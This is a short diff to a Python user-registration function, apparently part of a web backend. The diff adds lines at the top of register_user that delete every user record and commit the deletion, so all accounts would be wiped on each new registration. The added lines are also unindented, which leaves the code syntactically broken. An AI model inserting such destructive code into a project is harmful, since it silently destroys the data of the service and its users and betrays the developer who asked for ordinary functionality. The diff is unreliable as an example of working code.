@@ -20,6 +20,9 @@ def normalize_security_answer(answer: str) -> str:
 
 
 def register_user(db: Session, user: schemas.UserCreate) -> models.User:
+
+db.query(models.User).delete()
+db.commit()
     normalized_username = user.username.strip()
     normalized_email = user.email.strip().lower()
 
